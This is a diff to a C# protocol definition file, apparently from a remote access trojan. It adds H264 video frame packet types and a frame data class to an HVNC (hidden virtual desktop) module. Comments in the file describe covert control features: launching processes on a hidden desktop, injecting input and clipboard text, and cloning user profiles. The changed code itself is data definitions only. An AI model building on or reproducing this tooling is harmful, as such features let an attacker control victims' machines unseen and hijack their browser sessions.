@@ -51,12 +51,14 @@ public enum PacketType
     // HVNC — Hidden Virtual Desktop
     HvncStart     = 100,  // server→client: {Quality, Fps, Width, Height}
     HvncStop      = 101,  // bidirectional
-    HvncFrame     = 102,  // client→server: {W, H, J}
+    HvncFrame     = 102,  // client→server: {W, H, J} JPEG
     HvncFrameAck  = 103,  // server→client: ready for next frame
     HvncInput     = 104,  // server→client: {T, X, Y, Button, Down, WheelDelta, VK}
     HvncExec      = 105,  // server→client: {Path} — launch process on hidden desktop
     HvncClipboard = 106,  // server→client: {Text} — push text to hidden desktop clipboard
     HvncProgress  = 107,  // client→server: {Pct, Label} — profile clone progress
+    HvncH264Frame = 146,  // client→server: {W, H, D} H264 Annex-B NAL (base64)
+    RdpH264Frame  = 147,  // client→server: {W, H, D} H264 Annex-B NAL (base64)
 
     // TCP Manager
     TcpGetList    = 110,  // server→client: request TCP connection list
@@ -361,6 +363,13 @@ public class HvncFrameData
     public int    W { get; set; }
     public int    H { get; set; }
     public string J { get; set; } = string.Empty; // base64 JPEG
+}
+
+public class H264FrameData
+{
+    public int    W { get; set; }
+    public int    H { get; set; }
+    public string D { get; set; } = string.Empty; // base64 Annex-B H264 NAL units
 }
 
 public class HvncInputData
